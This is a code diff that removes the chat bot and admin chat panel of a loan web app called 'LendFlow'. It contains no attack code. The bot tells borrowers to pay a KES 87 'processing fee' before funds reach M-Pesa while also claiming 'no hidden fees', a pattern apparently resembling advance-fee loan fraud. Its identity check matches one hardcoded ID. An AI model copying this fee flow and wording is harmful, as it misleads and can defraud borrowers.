-  function processChatMessage(text){
-    const lower = text.toLowerCase();
-    if(chatCustomerValid && chatIdentified){ handleValidCustomerReply(text); return; }
-    if(!chatIdentified){
-      const idMatch = text.match(/\b(\d{6,9})\b/);
-      if(idMatch){
-        const possibleId = idMatch[1];
-        let matchedCustomer = null;
-        if(possibleId === CHAT_CONFIG.ALLOWED_CUSTOMER.nationalId) matchedCustomer = CHAT_CONFIG.ALLOWED_CUSTOMER;
-        if(matchedCustomer){
-          chatIdentified = true; chatCustomerValid = true; chatVerifiedInfo = matchedCustomer;
-          agentReply(`✅ Identity verified! Welcome, **${esc(matchedCustomer.name)}**! I can see you're a registered customer. How can I assist you today?`);
-        } else {
-          chatIdentified = true; chatCustomerValid = false;
-          agentReply(CHAT_CONFIG.AUTO_REPLY_DENIED);
-        }
-      } else {
-        agentReply("To assist you, I need to verify your identity first. Please provide your **Full Name** and **National ID Number**.");
-      }
-      return;
-    }
-    if(!chatCustomerValid){ agentReply("I'm sorry, but I can only assist registered customers. Please apply for a loan through our application form. Thank you! 🙏"); }
-  }
-
-  function handleValidCustomerReply(text){
-    const lower = text.toLowerCase();
-    const info = chatVerifiedInfo;
-    const app = DB.apps.find(a => a.nationalId === info.nationalId);
-
-    if(/\b(hi|hello|hey|good morning|good evening|good afternoon|howdy|sup|yo)\b/.test(lower)){
-      agentReply([`Hello again, ${esc(info.name)}! 👋 How can I help you today?`, `Hi ${esc(info.name)}! 😊 What can I do for you?`][Math.floor(Math.random()*2)]);
-      return;
-    }
-    if(/\b(thank|thanks|thx|appreciate|grateful)\b/.test(lower)){
-      agentReply([`You're welcome! 😊`, `My pleasure! 🙏`][Math.floor(Math.random()*2)]);
-      return;
-    }
-    if(/\b(balance|status|how much|outstanding|owe|remaining)\b/.test(lower)){
-      if(app){
-        let st = app.status;
-        if(app.withdrawn) st = 'Withdrawn to M-Pesa';
-        else if(app.pendingWithdrawal) st = 'Pending Withdrawal';
-        agentReply(`Here's your loan summary, **${esc(info.name)}**:\n\n💰 **Balance:** ${KES(app.balance)}\n📊 **Status:** ${st}\n💳 **Monthly:** ${KES(app.monthly)}\n📅 **Term:** ${app.term} months\n\nAnything else?`);
-      } else {
-        agentReply(`You have **no active loan** with LendFlow. Click "Apply Now"! 😊`);
-      }
-      return;
-    }
-    if(/\b(pay|repay|payment|mpesa|m-pesa|send|stk)\b/.test(lower)){
-      if(app && app.balance > 0 && !app.pendingWithdrawal && !app.withdrawn)
-        agentReply(`To repay, go to **Dashboard** and click **"Repay via M-Pesa"**. Your next payment is **${KES(app.monthly)}**.`);
-      else if(app && app.pendingWithdrawal) agentReply(`Your withdrawal is **pending**! ⏳ Funds will arrive in M-Pesa shortly.`);
-      else if(app && app.withdrawn) agentReply(`Your loan has been **fully withdrawn** to M-Pesa! 🎉`);
-      else if(app && app.balance === 0) agentReply(`Great news! 🎉 Your loan is fully **repaid**.`);
-      else agentReply(`No active loan to repay.`);
-      return;
-    }
-    if(/\b(withdraw|withdrawal|mpesa withdraw|funds|disburse)\b/.test(lower)){
-      if(app && (app.status === 'Approved') && !app.pendingWithdrawal && !app.withdrawn)
-        agentReply(`To withdraw to **M-Pesa**:\n\n1️⃣ Go to **Dashboard**\n2️⃣ Click **"Withdraw To M-Pesa"**\n3️⃣ Pay **processing fee of KES 87**\n4️⃣ Funds sent to your M-Pesa!`);
-      else if(app && app.pendingWithdrawal) agentReply(`Your withdrawal is being processed! ⏳`);
-      else if(app && app.withdrawn) agentReply(`You've already withdrawn your funds! ✅`);
-      else agentReply(`No funds available for withdrawal. Apply first!`);
-      return;
-    }
-    if(/\b(apply|application|new loan|borrow|new)\b/.test(lower)){
-      agentReply(`Ready to apply? 🎯 Click **"Apply Now"** at the top!`);
-      return;
-    }
-    if(/\b(interest|rate|percentage|apr|cost)\b/.test(lower)){
-      agentReply(`📊 **Monthly:** 2.9%\n✅ **No hidden fees**\n✅ **Fixed payments**`);
-      return;
-    }
-    if(/\b(interest|rate|percentage|apr|cost)\b/.test(lower)){
-      agentReply(`📊 **Monthly:** 2.9%\n✅ **No hidden fees**\n✅ **Fixed payments**`);
-      return;
-    }
-    if(/\b(profile|my info|details|account|personal)\b/.test(lower)){
-      agentReply(`Your details:\n👤 **${esc(info.name)}**\n📧 ${esc(info.email)}\n📱 ${esc(info.phone)}\n💼 ${esc(info.employment)}\n💰 ${KES(info.income)}`);
-      return;
-    }
-    if(/\b(help|support|what can you|options|menu|commands)\b/.test(lower)){
-      agentReply(`I can help with:\n🔹 **balance/status**\n🔹 **Payments**\n🔹 **Withdraw** to M-Pesa\n🔹 **Apply** for loan\n🔹 **Interest rates**\n🔹 **Profile**`);
-      return;
-    }
-    if(/\b(bye|goodbye|see you|later|farewell)\b/.test(lower)){
-      agentReply(`Goodbye, ${esc(info.name)}! 😊👋`);
-      return;
-    }
-    agentReply(`Try asking about your **balance**, **payments**, **withdraw**, or type "help". 😊`);
-  }
-
-  /* ---------- Admin Chat Integration ---------- */
-  function updateAdminChatList() {
-    const list = $('#adminChatList');
-    const convs = window.LendFlowChat.conversations;
-    const entries = Object.entries(convs).filter(([id, c]) => c.active);
-    $('#adminChatCount').textContent = entries.length;
-    if(entries.length === 0){
-      list.innerHTML = '<p class="text-sm text-slate-400 text-center py-8">No active chats yet.</p>';
-      return;
-    }
-    list.innerHTML = entries.map(([id, conv]) => {
-      const info = conv.customerInfo || { name:'Unknown', nationalId:id };
-      const lastMsg = conv.messages[conv.messages.length-1];
-      const lastText = lastMsg ? (lastMsg.text.length>40 ? lastMsg.text.substring(0,40)+'…' : lastMsg.text) : '';
-      const time = lastMsg ? new Date(lastMsg.timestamp).toLocaleTimeString('en-KE',{hour:'2-digit',minute:'2-digit'}) : '';
-      const sel = adminSelectedCustomer === id;
-      return `<button data-admin-chat="${esc(id)}" class="w-full text-left p-3 rounded-xl transition ${sel?'bg-brand-500/10 border border-brand-500/30':'hover:bg-slate-100 dark:hover:bg-slate-800 border border-transparent'}">
-        <div class="flex items-center justify-between mb-1"><span class="font-semibold text-sm">${esc(info.name)}</span><span class="text-[10px] text-slate-400">${esc(time)}</span></div>
-        <p class="text-xs text-slate-500 dark:text-slate-400 truncate">${esc(lastText)}</p>
-      </button>`;
-    }).join('');
-  }
-
-  function renderAdminChatMessages(customerId){
-    const container = $('#adminChatMessages');
-    const conv = window.LendFlowChat.conversations[customerId];
-    if(!conv) return;
-    container.innerHTML = conv.messages.map(msg => {
-      if(msg.type === 'customer' || msg.type === 'user'){
-        return `<div class="flex items-start gap-2 flex-row-reverse">
-          <span class="w-7 h-7 rounded-lg bg-slate-400 text-white grid place-items-center font-bold text-xs flex-shrink-0 mt-1">C</span>
-          <div class="bg-brand-500 text-white rounded-2xl rounded-tr-sm px-3.5 py-2.5 shadow-sm max-w-[80%]"><p class="text-sm">${esc(msg.text)}</p><span class="text-[10px] text-white/60 mt-1 block text-right">${new Date(msg.timestamp).toLocaleTimeString('en-KE',{hour:'2-digit',minute:'2-digit'})}</span></div>
-        </div>`;
-      } else {
-        return `<div class="flex items-start gap-2">
-          <span class="w-7 h-7 rounded-lg bg-brand-500 text-white grid place-items-center font-bold text-xs flex-shrink-0 mt-1">A</span>
-          <div class="bg-white dark:bg-ink-700 rounded-2xl rounded-tl-sm px-3.5 py-2.5 shadow-sm max-w-[80%]"><p class="text-sm">${esc(msg.text)}</p><span class="text-[10px] text-slate-400 mt-1 block text-right">${new Date(msg.timestamp).toLocaleTimeString('en-KE',{hour:'2-digit',minute:'2-digit'})}</span></div>
-        </div>`;
-      }
-    }).join('');
-    container.scrollTop = container.scrollHeight;
-  }
-
-  document.addEventListener('click', e => {
-    const chatBtn = e.target.closest('[data-admin-chat]');
-    if(chatBtn){
-      const cid = chatBtn.dataset.adminChat;
-      adminSelectedCustomer = cid;
-      const conv = window.LendFlowChat.conversations[cid];
-      if(conv){
-        $('#adminNoChatSelected').hidden = true;
-        $('#adminChatConversation').hidden = false;
-        $('#adminChatCustomerName').textContent = conv.customerInfo.name;
-        $('#adminChatCustomerInfo').textContent = `ID: ${conv.customerInfo.nationalId} | ${conv.customerInfo.phone}`;
-        $('#adminChatInput').disabled = false;
-        $('#adminChatSend').disabled = true;
-        renderAdminChatMessages(cid);
-        updateAdminChatList();
-      }
-    }
-  });
-
-  $('#adminChatInput').addEventListener('input', () => {
-    $('#adminChatSend').disabled = $('#adminChatInput').value.trim().length === 0;
-  });
-  $('#adminChatInput').addEventListener('keydown', (e) => {
-    if(e.key === 'Enter' && !$('#adminChatSend').disabled){ e.preventDefault(); sendAdminChatReply(); }
-  });
-  $('#adminChatSend').addEventListener('click', sendAdminChatReply);
-
-  function sendAdminChatReply(){
-    const text = $('#adminChatInput').value.trim();
-    if(!text || !adminSelectedCustomer) return;
-    const conv = window.LendFlowChat.conversations[adminSelectedCustomer];
-    if(!conv) return;
-    conv.messages.push({ type:'admin', text, timestamp:Date.now() });
-    conv.lastActivity = Date.now();
-    if(chatCustomerValid && chatVerifiedInfo && chatVerifiedInfo.nationalId === adminSelectedCustomer){
-      addChatMessage('agent', text);
-    }
-    $('#adminChatInput').value = '';
-    $('#adminChatSend').disabled = true;
-    renderAdminChatMessages(adminSelectedCustomer);
-    updateAdminChatList();
-  }
-
-  $('#adminChatEnd').addEventListener('click', () => {
-    if(!adminSelectedCustomer) return;
-    if(confirm('End this chat?')){
-      const conv = window.LendFlowChat.conversations[adminSelectedCustomer];
-      if(conv){
-        conv.active = false;
-        if(chatCustomerValid && chatVerifiedInfo && chatVerifiedInfo.nationalId === adminSelectedCustomer){
-          addChatMessage('agent', 'This chat has been ended. Thank you! 🙏');
-          chatIdentified = false; chatCustomerValid = false; chatVerifiedInfo = null;
-        }
-      }
-      adminSelectedCustomer = null;
-      $('#adminNoChatSelected').hidden = false;
-      $('#adminChatConversation').hidden = true;
-      updateAdminChatList();
-      toast('Chat ended.', 'info');
-    }
-  });
-
-  // Refresh admin chat periodically
-  setInterval(() => {
-    if(adminSelectedCustomer) renderAdminChatMessages(adminSelectedCustomer);
-    updateAdminChatList();
-  }, 3000);
-
-  // Patch renderAdmin to also update chat
-  const _origRenderAdmin = renderAdmin;
-  renderAdmin = function(s){ _origRenderAdmin(s); updateAdminChatList(); };
 
   /* ---------- Init ---------- */
   navigate('landing');
